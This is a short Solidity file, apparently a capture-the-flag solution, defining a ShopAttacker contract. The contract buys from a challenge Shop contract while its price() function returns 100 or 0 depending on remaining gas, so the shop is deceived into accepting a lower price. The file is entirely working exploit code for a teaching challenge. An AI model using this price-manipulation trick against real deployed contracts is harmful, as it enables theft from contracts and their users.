pragma solidity 0.8.15;

import "../challenge-contracts/Shop.sol";

contract ShopAttacker {
    uint256 private constant REQUIRE_PRICE = 100;
    uint256 private constant GAS_THRESHOLD = 28_096_381;

    function attack(address target) external {
        Shop(target).buy();
    }

    function price() external view returns (uint256) {
        uint256 gas = gasleft();
        if(gas >= GAS_THRESHOLD) {
            return 100;
        } else {
            return 0;
        }
    }
}